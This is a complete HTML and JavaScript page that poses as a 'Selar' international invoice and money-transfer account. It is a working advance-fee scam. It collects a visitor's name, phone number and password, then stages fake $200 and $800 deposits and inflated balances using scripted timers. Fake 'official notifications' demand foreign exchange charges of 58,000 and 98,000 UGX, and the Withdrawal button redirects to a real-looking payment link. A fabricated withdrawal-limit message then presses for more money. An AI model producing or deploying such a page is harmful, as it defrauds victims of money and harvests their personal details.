<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selar Transaction System - Chicago Theme</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --jpesa-blue: #1a73e8;
            --jpesa-red: #d93025;
            --bg-light: #f1f3f4;
            --dark-text: #202124;
            --border-gray: #dadce0;
            --success-green: #00a65a;
            --selar-brown: #8b4513;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-light);
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            background: white;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            position: relative;
            overflow: hidden;
        }

        .top-banner {
            height: 60px;
            background: linear-gradient(90deg, #ffffff 0%, #1a73e8 70%, #8ab4f8 100%);
            display: flex;
            align-items: center;
            padding: 0 15px;
        }

        .header-content { text-align: right; padding: 20px; }
        .jpesa-title { color: var(--jpesa-red); font-size: 1.2rem; font-weight: bold; margin: 0; }
        .jpesa-sub { font-size: 0.7rem; color: #555; line-height: 1.2; }

        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; text-align:center; }

        .form-section { padding: 0 30px 30px; }
        
        .header-login { background: var(--selar-brown); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
        .header-dash { background: var(--success-green); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
        
        .field { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 0.75rem; font-weight: bold; color: #666; text-transform: uppercase; margin-bottom: 4px; }
        input { width: 100%; padding: 12px; border: 1px solid var(--border-gray); border-radius: 4px; box-sizing: border-box; background: #fafafa; }

        .btn-action {
            background: var(--success-green);
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-top: 10px;
        }

        .receipt-card {
            border: 1px solid var(--border-gray);
            padding: 15px;
            position: relative;
            background: #fff;
            margin-top: 15px;
        }

        @keyframes blinker { 50% { opacity: 0; } }
        .exact-blink { color: var(--success-green); font-weight: bold; animation: blinker 1s linear infinite; }
        .live-tag-anim { color: var(--success-green); font-weight: bold; font-size: 0.8rem; animation: blinker 1.2s linear infinite; margin-left: 5px; }

        .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; font-size: 0.7rem; font-weight: bold; background: #fff; }
        
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
        .modal { background: white; border-radius: 12px; max-width: 420px; width: 100%; text-align: center; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        
        .modal-header { background: #f8f9fa; border-bottom: 1px solid #eee; padding: 15px; font-weight: bold; color: var(--jpesa-blue); display: flex; align-items: center; justify-content: center; gap: 10px; }
        .modal-body { padding: 25px; }

        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .official-notice-box {
            background: linear-gradient(135deg, #fff5f5 0%, #ffffff 100%);
            border-left: 5px solid var(--jpesa-red);
            padding: 15px;
            border-radius: 8px;
            color: #444;
            font-size: 0.85rem;
            line-height: 1.5;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }

        .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="top-banner">
        <div id="masterCardLink" style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center; cursor: pointer;" onclick="trigger800Flow()">
            <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
        </div>
    </div>

    <div class="header-content">
        <p class="jpesa-title">Selar invoice International</p>
        <p class="jpesa-sub">Plot Z, USA, Chicago, Brooklyn Street Road<br>P.O. Box 25630 - Chicago<br>+1-USA</p>
    </div>

    <div id="loginPage" class="form-section">
        <div class="bank-logo">üèõÔ∏è</div>
        <div class="header-login">SELAR ACCOUNT</div>
        
        <div class="field"><label>Legal Full Name</label><input type="text" id="regName"></div>
        <div class="field"><label>Telephone Number</label><input type="text" id="regPhone"></div>
        <div class="field"><label>Email Address</label><input type="email" id="regEmail"></div>
        <div style="display:flex; gap:10px;">
            <div class="field" style="flex:1;"><label>Password</label><input type="password" id="regPass" placeholder="******"></div>
            <div class="field" style="flex:1;"><label>Confirm</label><input type="password" id="regConfirm" placeholder="******"></div>
        </div>
        <button class="btn-action" onclick="register()">OPEN YOUR SELAR ACCOUNT</button>
    </div>

    <div id="dashboard" class="form-section" style="display:none;">
        <div class="header-dash">SELAR INVOICE ACCOUNT</div>
        
        <div id="userInfoDisplay" class="user-info-header"></div>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 5px solid var(--jpesa-blue);">
            <div style="font-size: 0.8rem; color: #666;">AVAILABLE BALANCE</div>
            <div id="ugxBalance" style="font-size: 1.8rem; font-weight: bold; color: var(--jpesa-blue);">0.00UGX</div>
            <div style="font-size: 1rem;">Exact: <span id="usdBalance" class="">0.00$</span></div>
        </div>

        <div id="mainNotif" class="receipt-card">
            <div id="notifContent">
               <p style="font-size: 0.85rem; color: #444; margin: 0;">Thank you for joining our platform, now you can send and receive money Globally through our secured System, 24/7 transaction instantly</p>
            </div>
        </div>

        <div style="display:flex; gap:10px; margin-top:15px;">
            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="handleWithdraw()">Withdrawal</button>
            <button class="btn-action" style="margin:0; background: #444;" onclick="handleWithdraw()">Receive</button>
        </div>

        <div class="payment-grid">
            <div class="pay-box" style="color: red;">AIRTEL</div>
            <div class="pay-box"><span style="color: blue;">MTN</span> <span style="color: #ffd700;">MOMO</span></div>
            <div class="pay-box" style="color:var(--jpesa-blue)">STRIPE</div>
            <div id="epayBtn" class="pay-box color-epay" style="cursor:pointer;" onclick="handleEpay()">EPAY</div>
        </div>

        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid var(--success-green); background: #fdfdfd;">
            <div style="display:flex; align-items:center; margin-bottom: 10px;">
                <label style="margin:0; font-size: 0.8rem;">Recent Activity</label>
                <span id="liveTag" class=""></span>
            </div>
            <div id="activityLog" style="font-weight: bold; font-size: 0.9rem; padding: 10px; border-radius: 5px;">No transactions</div>
        </div>
    </div>
</div>

<div id="overlay" class="overlay">
    <div class="modal" id="modalContent"></div>
</div>

<script>
    // Local Disk (LocalStorage) Logic
    let state = JSON.parse(localStorage.getItem('selar_storage')) || { step: 0, name: '', phone: '' };

    window.onload = () => {
        if(state.step > 0) renderDashboard();
    };

    function updateState(key, val) {
        state[key] = val;
        localStorage.setItem('selar_storage', JSON.stringify(state));
    }

    function register() {
        const p1 = document.getElementById('regPass').value;
        const p2 = document.getElementById('regConfirm').value;
        
        if (p1 === "" || p1 !== p2) {
            alert("Passwords do not match or are empty!");
            return;
        }

        updateState('name', document.getElementById('regName').value);
        updateState('phone', document.getElementById('regPhone').value);
        
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `
            <div class="modal-body">
                <h3>Your Selar account loading</h3>
                <div class="progress-container"><div id="regProgress" class="progress-bar"></div></div>
                <p id="progText">0%</p>
            </div>
        `;

        let width = 0;
        let interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                ov.style.display = 'none';
                updateState('step', 1);
                renderDashboard();
                setTimeout(show200Detection, 11000);
            } else {
                width += 2;
                document.getElementById('regProgress').style.width = width + '%';
                document.getElementById('progText').innerText = width + '%';
            }
        }, 50);
    }

    function renderDashboard() {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
        
        if(state.step >= 2) {
            document.getElementById('ugxBalance').innerText = "743,000UGX";
            document.getElementById('usdBalance').innerText = "200.00$";
            document.getElementById('usdBalance').className = "exact-blink";
            
            document.getElementById('notifContent').innerHTML = `
                <div class="official-notice-box" style="border-color: #ff9800; background: #fffdf5;">
                    <b style="color:#e65100;">OFFICIAL NOTIFICATION:</b><br>
                    Your SIM Card doesn't support dollar deposit, Recharge your SIM Card with foreign exchange charge of <b style="color:var(--jpesa-red)">58,000UGX</b>, Click withdrawal then on the next page fill in your mobile number 07XXXX and you allow notification to deposit invoice transaction on Your mobile number account
                </div>`;
            
            document.getElementById('liveTag').innerHTML = "LIVE";
            document.getElementById('liveTag').className = "live-tag-anim";
            document.getElementById('activityLog').innerHTML = `<span style="color: var(--success-green);">Received Amount 200.00$ from lolikishee, USA CHICAGO</span>`;
        }

        if(state.step === 3) {
            document.getElementById('epayBtn').onclick = null;
            document.getElementById('epayBtn').style.opacity = "0.6";
            document.getElementById('notifContent').innerHTML = `
                <div style="background: #e8f5e9; border: 2px dashed var(--success-green); padding: 15px; border-radius: 10px; color: var(--success-green); font-weight: bold; text-align: center;">
                    PAID! foreign exchange charge of 58,000UGX by ${state.name} (${state.phone})
                </div>`;
        }

        if(state.step === 4) {
            document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
            document.getElementById('usdBalance').innerText = "800.00$";
            document.getElementById('usdBalance').className = "exact-blink";
            document.getElementById('masterCardLink').onclick = null;

            document.getElementById('notifContent').innerHTML = `
                <div class="official-notice-box" style="border-color: var(--jpesa-blue); background: #f0f7ff;">
                    <b style="color:var(--jpesa-blue);">GLOBAL INVOICE CLEARANCE:</b><br>
                    Foreign exchange charge needed <b style="color:var(--jpesa-red)">98,000UGX</b> to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account
                </div>`;
            
            document.getElementById('liveTag').innerHTML = "LIVE";
            document.getElementById('liveTag').className = "live-tag-anim";
            document.getElementById('activityLog').innerHTML = `<span style="color: var(--jpesa-blue);">Received Amount 800.00$ from lolikishee, USA CHICAGO</span>`;
        }
    }

    function show200Detection() {
        if(state.step >= 2) return;
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `
            <div class="modal-header"><span>üèõÔ∏è</span> DEPOSIT DETECTED</div>
            <div class="modal-body">
                <p style="color: #555; font-size: 0.95rem; line-height: 1.6;">
                    Deposit of <b>200$</b> on <br>
                    Sender ID: <span style="color:var(--jpesa-blue)">A001112</span><br>
                    Name: <b>lolikishee</b><br>
                    Address: <b>USA CHICAGO</b><br><br>
                    Press confirm to initiate the transaction on Your Selar account.
                </p>
                <button class="btn-action" onclick="confirm200()">Confirm</button>
            </div>
        `;
    }

    function confirm200() {
        document.getElementById('modalContent').innerHTML = `
            <div class="modal-body">
                <div class="loading-ring"></div>
                <p style="font-weight:bold; color: #444;">Always confirm any Transaction invoice on Your Selar account when ever You login for safety of transaction</p>
            </div>
        `;
        setTimeout(() => {
            document.getElementById('overlay').style.display = 'none';
            updateState('step', 2);
            renderDashboard();
        }, 6000);
    }

    function handleEpay() {
        if(state.step < 2) return;
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `<div class="modal-body"><div class="loading-ring"></div><p>Confirming payment of Foreign exchange charge by ${state.name} (${state.phone})</p></div>`;
        
        setTimeout(() => {
            ov.style.display = 'none';
            updateState('step', 3);
            renderDashboard();
        }, 10000);
    }

    function handleWithdraw() {
        if(state.step === 2) {
            window.location.href = "https://pay.guto.app/@selara4?a=58000";
        } else if(state.step === 3) {
            const ov = document.getElementById('overlay');
            ov.style.display = 'flex';
            document.getElementById('modalContent').innerHTML = `
                <div class="modal-body">
                    <div class="loading-ring"></div>
                    <p>initiating transactions of 743,000UGX to ${state.name} (${state.phone})</p>
                </div>`;
            setTimeout(() => {
                document.getElementById('modalContent').innerHTML = `
                    <div class="modal-header" style="color:var(--jpesa-red)">LIMIT REACHED</div>
                    <div class="modal-body">
                        <p style="font-size:0.9rem; color:#444;">Accuse us our Customer, Selar system Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card</p>
                        <button class="btn-action" onclick="document.getElementById('overlay').style.display='none'">okay have understood!</button>
                    </div>`;
            }, 10000);
        } else if(state.step === 4) {
            window.location.href = "https://pay.guto.app/@selara4?a=98000";
        }
    }

    function trigger800Flow() {
        if(state.step !== 3) return;
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `<div class="modal-body"><div class="loading-ring"></div><p>Configuring selar invoice transaction of 800$ to Your Selar account</p></div>`;
        
        setTimeout(() => {
            document.getElementById('modalContent').innerHTML = `
                <div class="modal-header"><span>üí∞</span> DEPOSIT DETECTED</div>
                <div class="modal-body">
                    <p style="color: #555; font-size: 0.95rem; line-height: 1.6;">
                        Deposit of <b>800$</b> on <br>
                        Sender ID: <span style="color:var(--jpesa-blue)">A001112</span><br>
                        Name: <b>lolikishee</b><br>
                        Address: <b>USA CHICAGO</b><br><br>
                        Press confirm to initiate the transaction on Your Selar account.
                    </p>
                    <button class="btn-action" onclick="finalize800()">Confirm</button>
                </div>`;
        }, 10000);
    }

    function finalize800() {
        document.getElementById('overlay').style.display = 'none';
        updateState('step', 4);
        renderDashboard();
    }
</script>
</body>
</html>
